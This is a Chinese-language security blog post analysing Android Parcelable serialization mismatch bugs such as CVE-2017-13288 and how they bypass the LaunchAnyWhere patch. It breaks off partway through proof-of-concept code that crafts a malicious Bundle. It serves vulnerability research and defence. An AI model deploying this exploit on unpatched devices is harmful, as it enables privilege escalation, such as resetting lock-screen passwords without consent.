<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>Bundle风水——Android序列化与反序列化不匹配漏洞详解 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Bundle风水——Android序列化与反序列化不匹配漏洞详解</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Bundle风水——Android序列化与反序列化不匹配漏洞详解</h1><div class="post-meta">2018-07-03<span> | </span><span class="category"><a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 4k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 18</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-背景知识"><span class="toc-number">2.</span> <span class="toc-text">0x01 背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Parcelable-序列化"><span class="toc-number">2.1.</span> <span class="toc-text">Android Parcelable 序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bundle"><span class="toc-number">2.2.</span> <span class="toc-text">Bundle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LaunchAnyWhere漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">LaunchAnyWhere漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-案例1：CVE-2017-13288"><span class="toc-number">3.</span> <span class="toc-text">0x02 案例1：CVE-2017-13288</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">3.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-案例2：CVE-2017-13315"><span class="toc-number">4.</span> <span class="toc-text">0x03 案例2：CVE-2017-13315</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-1"><span class="toc-number">4.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-后记"><span class="toc-number">5.</span> <span class="toc-text">0x04 后记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考"><span class="toc-number">5.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="post-content"><p>作者：heeeeen</p>
<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>最近几个月，Android安全公告公布了一系列系统框架层的高危提权漏洞，如下表所示。</p>
<table>
<thead>
<tr>
<th>CVE</th>
<th>Parcelable对象</th>
<th>公布时间</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/b87c968e5a41a1a09166199bf54eee12608f3900" target="_blank" rel="noopener">CVE-2017-0806</a></td>
<td>GateKeeperResponse</td>
<td>2017.10</td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/47ebfaa2196aaf4fbeeec34f1a1c5be415cf041b%5E%21/#F0" target="_blank" rel="noopener">CVE-2017-13286</a></td>
<td>OutputConfiguration</td>
<td>2018.04</td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a" target="_blank" rel="noopener">CVE-2017-13287</a></td>
<td>VerifyCredentialResponse</td>
<td>2018.04</td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3" target="_blank" rel="noopener">CVE-2017-13288</a></td>
<td>PeriodicAdvertisingReport</td>
<td>2018.04</td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02" target="_blank" rel="noopener">CVE-2017-13289</a></td>
<td>ParcelableRttResults</td>
<td>2018.04</td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/2950276f61220e00749f8e24e0c773928fefaed8" target="_blank" rel="noopener">CVE-2017-13311</a></td>
<td>SparseMappingTable</td>
<td>2018.05</td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/35bb911d4493ea94d4896cc42690cab0d4dbb78f" target="_blank" rel="noopener">CVE-2017-13315</a></td>
<td>DcParamObject</td>
<td>2018.05</td>
</tr>
</tbody></table>
<p>这批漏洞很有新意，似乎以前没有看到过类似的，其共同特点在于框架中Parcelable对象的写入（序列化）和读出（反序列化）不一致，比如将一个成员变量写入时为long，而读入时为int。这种错误显而易见，但是能够造成何种危害，如何证明是一个安全漏洞，却难以从补丁直观地得出结论。</p>
<p>由于漏洞原作者也没有给出Writeup，这批漏洞披上了神秘面纱。好在<a href="https://www.anquanke.com/post/id/103570" target="_blank" rel="noopener">漏洞预警 | Android系统序列化、反序列化不匹配漏洞</a>[1]一文给出了漏洞利用的线索——绕过launchAnywhere的补丁。结合这个线索，我们能够通过一个有漏洞的Parcelable对象，实现以Settings系统应用发送任意Intent启动Activity的能力。</p>
<h3 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h3><h4 id="Android-Parcelable-序列化"><a href="#Android-Parcelable-序列化" class="headerlink" title="Android Parcelable 序列化"></a>Android Parcelable 序列化</h4><p>Android提供了独有的Parcelable接口来实现序列化的方法，只要实现这个接口，一个类的对象就可以实现序列化并可以通过Intent或Binder传输，见下面示例中的典型用法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class MyParcelable implements Parcelable &#123;</span><br><span class="line">     private int mData;</span><br><span class="line"></span><br><span class="line">     public int describeContents() &#123;</span><br><span class="line">         return 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     public void writeToParcel(Parcel out, int flags) &#123;</span><br><span class="line">         out.writeInt(mData);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     public void readFromParcel(Parcel reply) &#123;</span><br><span class="line">         mData &#x3D; in.readInt();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     public static final Parcelable.Creator&lt;MyParcelable&gt; CREATOR</span><br><span class="line">             &#x3D; new Parcelable.Creator&lt;MyParcelable&gt;() &#123;</span><br><span class="line">         public MyParcelable createFromParcel(Parcel in) &#123;</span><br><span class="line">             return new MyParcelable(in);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         public MyParcelable[] newArray(int size) &#123;</span><br><span class="line">             return new MyParcelable[size];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     </span><br><span class="line">     private MyParcelable(Parcel in) &#123;</span><br><span class="line">         mData &#x3D; in.readInt();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>其中，关键的writeToParcel和readFromParcel方法，分别调用Parcel类中的一系列write方法和read方法实现序列化和反序列化。</p>
<h4 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h4><p>可序列化的Parcelable对象一般不单独进行序列化传输，需要通过Bundle对象携带。 Bundle的内部实现实际是Hashmap，以Key-Value键值对的形式存储数据。例如， Android中进程间通信频繁使用的Intent对象中可携带一个Bundle对象，利用<code>putExtra(key, value)</code>方法，可以往Intent的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型信息。</p>
<p>见/frameworks/base/core/java/android/os/Parcel.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Keep in sync with frameworks&#x2F;native&#x2F;include&#x2F;private&#x2F;binder&#x2F;ParcelValTypes.h.</span><br><span class="line">    private static final int VAL_NULL &#x3D; -1;</span><br><span class="line">    private static final int VAL_STRING &#x3D; 0;</span><br><span class="line">    private static final int VAL_INTEGER &#x3D; 1;</span><br><span class="line">    private static final int VAL_MAP &#x3D; 2;</span><br><span class="line">    private static final int VAL_BUNDLE &#x3D; 3;</span><br><span class="line">    private static final int VAL_PARCELABLE &#x3D; 4;</span><br><span class="line">    private static final int VAL_SHORT &#x3D; 5;</span><br><span class="line">    private static final int VAL_LONG &#x3D; 6;</span><br><span class="line">    private static final int VAL_FLOAT &#x3D; 7;</span><br></pre></td></tr></table></figure>
<p>对Bundle进行序列化时，依次写入携带所有数据的长度、Bundle魔数(0x4C444E42)和键值对。见BaseBundle.writeToParcelInner方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int lengthPos &#x3D; parcel.dataPosition();</span><br><span class="line">      parcel.writeInt(-1); &#x2F;&#x2F; dummy, will hold length</span><br><span class="line">      parcel.writeInt(BUNDLE_MAGIC);</span><br><span class="line">      int startPos &#x3D; parcel.dataPosition();</span><br><span class="line">      parcel.writeArrayMapInternal(map);</span><br><span class="line">      int endPos &#x3D; parcel.dataPosition();</span><br><span class="line">      &#x2F;&#x2F; Backpatch length</span><br><span class="line">      parcel.setDataPosition(lengthPos);</span><br><span class="line">      int length &#x3D; endPos - startPos;</span><br><span class="line">      parcel.writeInt(length);</span><br><span class="line">      parcel.setDataPosition(endPos);</span><br></pre></td></tr></table></figure>
<p>pacel.writeArrayMapInternal方法写入键值对，先写入Hashmap的个数，然后依次写入键和值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">   * Flatten an ArrayMap into the parcel at the current dataPosition(),</span><br><span class="line">   * growing dataCapacity() if needed.  The Map keys must be String objects.</span><br><span class="line">   *&#x2F;</span><br><span class="line">  &#x2F;* package *&#x2F; void writeArrayMapInternal(ArrayMap&lt;String, Object&gt; val) &#123;</span><br><span class="line">...</span><br><span class="line">      final int N &#x3D; val.size();</span><br><span class="line">      writeInt(N);</span><br><span class="line">     ... </span><br><span class="line">      int startPos;</span><br><span class="line">      for (int i&#x3D;0; i&lt;N; i++) &#123;</span><br><span class="line">          if (DEBUG_ARRAY_MAP) startPos &#x3D; dataPosition();</span><br><span class="line">          writeString(val.keyAt(i));</span><br><span class="line">          writeValue(val.valueAt(i));</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>接着，调用writeValue时依次写入Value类型和Value本身，如果是Parcelable对象，则调用writeParcelable方法，后者会调用Parcelable对象的writeToParcel方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public final void writeValue(Object v) &#123;</span><br><span class="line">        if (v &#x3D;&#x3D; null) &#123;</span><br><span class="line">            writeInt(VAL_NULL);</span><br><span class="line">        &#125; else if (v instanceof String) &#123;</span><br><span class="line">            writeInt(VAL_STRING);</span><br><span class="line">            writeString((String) v);</span><br><span class="line">        &#125; else if (v instanceof Integer) &#123;</span><br><span class="line">            writeInt(VAL_INTEGER);</span><br><span class="line">            writeInt((Integer) v);</span><br><span class="line">        &#125; else if (v instanceof Map) &#123;</span><br><span class="line">            writeInt(VAL_MAP);</span><br><span class="line">            writeMap((Map) v);</span><br><span class="line">        &#125; else if (v instanceof Bundle) &#123;</span><br><span class="line">            &#x2F;&#x2F; Must be before Parcelable</span><br><span class="line">            writeInt(VAL_BUNDLE);</span><br><span class="line">            writeBundle((Bundle) v);</span><br><span class="line">        &#125; else if (v instanceof PersistableBundle) &#123;</span><br><span class="line">            writeInt(VAL_PERSISTABLEBUNDLE);</span><br><span class="line">            writePersistableBundle((PersistableBundle) v);</span><br><span class="line">        &#125; else if (v instanceof Parcelable) &#123;</span><br><span class="line">            &#x2F;&#x2F; IMPOTANT: cases for classes that implement Parcelable must</span><br><span class="line">            &#x2F;&#x2F; come before the Parcelable case, so that their specific VAL_*</span><br><span class="line">            &#x2F;&#x2F; types will be written.</span><br><span class="line">            writeInt(VAL_PARCELABLE);</span><br><span class="line">            writeParcelable((Parcelable) v, 0);</span><br></pre></td></tr></table></figure>

<p>反序列化过程则完全是一个对称的逆过程，依次读入Bundle携带所有数据的长度、Bundle魔数(0x4C444E42)、键和值，如果值为Parcelable对象，则调用对象的readFromParcel方法，重新构建这个对象。</p>
<p>通过下面的代码，我们还可以把序列化后的Bundle对象存为文件进行研究。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle &#x3D; new Bundle();</span><br><span class="line">bundle.putParcelable(AccountManager.KEY_INTENT, makeEvilIntent());</span><br><span class="line"></span><br><span class="line">byte[] bs &#x3D; &#123;&#39;a&#39;, &#39;a&#39;,&#39;a&#39;, &#39;a&#39;&#125;;</span><br><span class="line">bundle.putByteArray(&quot;AAA&quot;, bs);</span><br><span class="line">Parcel testData &#x3D; Parcel.obtain();</span><br><span class="line">bundle.writeToParcel(testData, 0);</span><br><span class="line">byte[] raw &#x3D; testData.marshall();</span><br><span class="line">        try &#123;</span><br><span class="line">            FileOutputStream fos &#x3D; new FileOutputStream(&quot;&#x2F;sdcard&#x2F;obj.pcl&quot;);</span><br><span class="line">            fos.write(raw);</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; catch (FileNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>查看序列化后的Bundle数据如图<br><img src="/2018/07/03/bundle-mismatch/bundle-struct.png" alt="Bundle"></p>
<h4 id="LaunchAnyWhere漏洞"><a href="#LaunchAnyWhere漏洞" class="headerlink" title="LaunchAnyWhere漏洞"></a>LaunchAnyWhere漏洞</h4><p>Retme的<a href="http://retme.net/index.php/2014/08/20/launchAnyWhere.html" target="_blank" rel="noopener">这篇文章</a>[2]对LaunchAnyWhere漏洞进行了详细解析，这里我们借用文中的图，对漏洞简单进行回顾。</p>
<p><img src="/2018/07/03/bundle-mismatch/launchAnywhere.png" alt="launchAnywhere"></p>
<p>普通AppB作为Authenticator，通过Binder传递一个Bundle对象到system_server中的AccountManagerService，这个Bundle对象中包含的一个键值对<code>{KEY_INTENT:intent}</code>最终会传递到Settings系统应用，由后者调用startActivity(intent)。漏洞的关键在于，intent可以由普通AppB任意指定，那么由于Settings应用为高权限system用户（uid=1000)，因此最后的startActivity(intent)就可以启动手机上的任意Activity，包括未导出的Activity。例如，intent中指定Settings中的<code>com.android.settings.password.ChooseLockPassword</code>为目标Activity,则可以在不需要原锁屏密码的情况下重设锁屏密码。</p>
<p>Google对于这个漏洞的修补是在AccountManagerService中对AppB指定的intent进行检查，确保intent中目标Activity所属包的签名与调用AppB一致。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">      protected void checkKeyIntent(</span><br><span class="line">4704                int authUid,</span><br><span class="line">4705                Intent intent) throws SecurityException &#123;</span><br><span class="line">4706            long bid &#x3D; Binder.clearCallingIdentity();</span><br><span class="line">4707            try &#123;</span><br><span class="line">4708                PackageManager pm &#x3D; mContext.getPackageManager();</span><br><span class="line">4709                ResolveInfo resolveInfo &#x3D; pm.resolveActivityAsUser(intent, 0, mAccounts.userId);</span><br><span class="line">4710                ActivityInfo targetActivityInfo &#x3D; resolveInfo.activityInfo;</span><br><span class="line">4711                int targetUid &#x3D; targetActivityInfo.applicationInfo.uid;</span><br><span class="line">4712                if (!isExportedSystemActivity(targetActivityInfo)</span><br><span class="line">4713                        &amp;&amp; (PackageManager.SIGNATURE_MATCH !&#x3D; pm.checkSignatures(authUid,</span><br><span class="line">4714                                targetUid))) &#123;</span><br><span class="line">4715                    String pkgName &#x3D; targetActivityInfo.packageName;</span><br><span class="line">4716                    String activityName &#x3D; targetActivityInfo.name;</span><br><span class="line">4717                    String tmpl &#x3D; &quot;KEY_INTENT resolved to an Activity (%s) in a package (%s) that &quot;</span><br><span class="line">4718                            + &quot;does not share a signature with the supplying authenticator (%s).&quot;;</span><br><span class="line">4719                    throw new SecurityException(</span><br><span class="line">4720                            String.format(tmpl, activityName, pkgName, mAccountType));</span><br><span class="line">4721                &#125;</span><br></pre></td></tr></table></figure>

<p>上次过程涉及到两次跨进程的序列化数据传输。第一次，普通AppB将Bundle序列化后通过Binder传递给<code>system_server</code>，然后<code>system_server</code>通过Bundle的一系列getXXX（如getBoolean、getParcelable)函数触发反序列化，获得KEY_INTENT这个键的值——一个intent对象，进行安全检查。<br>若检查通过，调用writeBundle进行第二次序列化，然后Settings中反序列化后重新获得<code>{KEY_INTENT:intent}</code>，调用startActivity。</p>
<p>如果第二次序列化和反序列化过程不匹配，那么就有可能在<code>system_server</code>检查时Bundle中恶意的<code>{KEY_INTENT:intent}</code>不出现，而在<code>Settings</code>中出现，那么就完美地绕过了<code>checkKeyIntent</code>检查！下面我们就结合两个案例来说明其中的玄机。</p>
<h3 id="0x02-案例1：CVE-2017-13288"><a href="#0x02-案例1：CVE-2017-13288" class="headerlink" title="0x02 案例1：CVE-2017-13288"></a>0x02 案例1：CVE-2017-13288</h3><p>四月份公布的CVE-2017-13288漏洞出现在PeriodicAdvertisingReport类中，对比writeToParcel和readFromParcel函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public void writeToParcel(Parcel dest, int flags) &#123;</span><br><span class="line">        dest.writeInt(syncHandle);</span><br><span class="line">        dest.writeLong(txPower);</span><br><span class="line">        dest.writeInt(rssi);</span><br><span class="line">        dest.writeInt(dataStatus);</span><br><span class="line">        if (data !&#x3D; null) &#123;</span><br><span class="line">            dest.writeInt(1);</span><br><span class="line">            dest.writeByteArray(data.getBytes());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            dest.writeInt(0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private void readFromParcel(Parcel in) &#123;</span><br><span class="line">        syncHandle &#x3D; in.readInt();</span><br><span class="line">        txPower &#x3D; in.readInt();</span><br><span class="line">        rssi &#x3D; in.readInt();</span><br><span class="line">        dataStatus &#x3D; in.readInt();</span><br><span class="line">        if (in.readInt() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">            data &#x3D; ScanRecord.parseFromBytes(in.createByteArray());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在对txPower这个int类型成员变量进行操作时，写为long，读为int，因此经历一次不匹配的序列化和反序列化后txPower之后的成员变量都会错位4字节。那么如何绕过<code>checkKeyIntent</code>检查？</p>
<p>这是一项有挑战性的工作，需要在Bundle中精确布置数据。经过几天的思索，我终于想出了以下的解决方案：</p>
<p><img src="/2018/07/03/bundle-mismatch/PeriodicReport.png" alt="Bundle风水"></p>
<p>在Autherticator App中构造恶意Bundle，携带两个键值对。第一个键值对携带一个PeriodicAdvertisingReport对象，并将恶意KEY_INTENT的内容放在mData这个ByteArray类型的成员中，第二个键值对随便放点东西。由于这一次序列化需要精确控制内容，我们不希望发生不匹配，因此将PeriodicAdvertisingReport对象writeToParcel时，要和其readFromParcel对应。</p>
<p>那么在<code>system_server</code>发生的第一次反序列化中，生成PeriodicAdvertisingReport对象，syncHandle、txPower、rssi、dataStatus这些int型的数据均通过readInt读入为1，同时由于接下来的flag也为1，将恶意<code>KEY_INTENT</code>的内容读入到mData。此时，恶意KEY_INTENT不是一个单独的键值对，因此可以逃避checkIntent检查。</p>
<p>接着<code>system_server</code>将这个Bundle序列化，此时txPower这个变量使用writeLong写入Bundle，因此为占据8个字节，前4字节为1，后4字节为0。txPower后面的内容写入Bundle不变。</p>
<p>最后在<code>Settings</code>发生反序列化，txPower此时又变成了readInt，因此txPower读入为1，后面接着rssi却读入为0，发生了四字节的错位！接下来dataStatus读入为1，flag读入为1，<code>Settings</code>认为后面还有ByteArray，但读入的长度域却为1，因此把后面恶意KEY_INTENT的4字节length （ByteArray 4字节对齐）当做mData。至此，第一个键值对反序列化完毕。然后，恶意<code>KEY_INTENT</code>作为一个新的键值对就堂而皇之的出现了！最终的结果是取得以Settings应用的权限发送任意Intent，启动任意Activity的能力。</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>参考[2]编写Authenticator App，主要要点：</p>
<p>在AndroidManifest文件中设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;service android:name&#x3D;&quot;.AuthenticatorService&quot; android:exported&#x3D;&quot;true&quot; &gt;</span><br><span class="line">           &lt;intent-filter&gt;</span><br><span class="line">               &lt;action</span><br><span class="line">                   android:name&#x3D;&quot;android.accounts.AccountAuthenticator&quot; &#x2F;&gt;</span><br><span class="line">           &lt;&#x2F;intent-filter&gt;</span><br><span class="line">           &lt;meta-data android:name&#x3D;&quot;android.accounts.AccountAuthenticator&quot;</span><br><span class="line">               android:resource&#x3D;&quot;@xml&#x2F;authenticator&quot; &#x2F;&gt;</span><br><span class="line">       &lt;&#x2F;service&gt;</span><br></pre></td></tr></table></figure>
<p>实现AuthenticatorService</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class AuthenticatorService extends Service &#123;</span><br><span class="line">    @Nullable</span><br><span class="line">    @Override</span><br><span class="line">    public IBinder onBind(Intent intent) &#123;</span><br><span class="line">        MyAuthenticator authenticator &#x3D; new MyAuthenticator(this);</span><br><span class="line">        return authenticator.getIBinder();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现Authenticator，addAccount方法中构建恶意Bundle</p>
<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAuthenticator</span> <span class="keyword">extends</span> <span class="title">AbstractAccountAuthenticator</span> </span>{
    <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MyAuthenticator"</span>;

    <span class="keyword">private</span> Context m_context = <span class="keyword">null</span>;

    <span class="function"><span class="keyword">public</span> <span class="title">MyAuthenticator</span><span class="params">(Context context)</span> </span>{
        <span class="keyword">super</span>(context);
        m_context = context;
    }

    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> Bundle <span class="title">editProperties</span><span class="params">(AccountAuthenticatorResponse response, String accountType)</span> </span>{
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }

    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> Bundle <span class="title">addAccount</span><span class="params">(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options)</span> <span class="keyword">throws</span> NetworkErrorException </span>{
        Log.v(TAG, <span class="string">"addAccount"</span>);

        Bundle evilBundle = <span class="keyword">new</span> Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        <span class="comment">// Manipulate the raw data of bundle Parcel</span>
        <span class="comment">// Now we replace this right Parcel data to evil Parcel data</span>
        pcelData.writeInt(<span class="number">2</span>); <span class="comment">// number of elements in ArrayMap</span>
        <span class="comment">/*****************************************/</span>
        <span class="comment">// mismatched object</span>
        pcelData.writeString(<span class="string">"mismatch"</span>);
        pcelData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PACELABLE</span>
        pcelData.writeString(<span class="string">"android.bluetooth.le.PeriodicAdvertisingReport"</span>); <span class="comment">// name of Class Loader</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//syncHandle</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//txPower</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span>
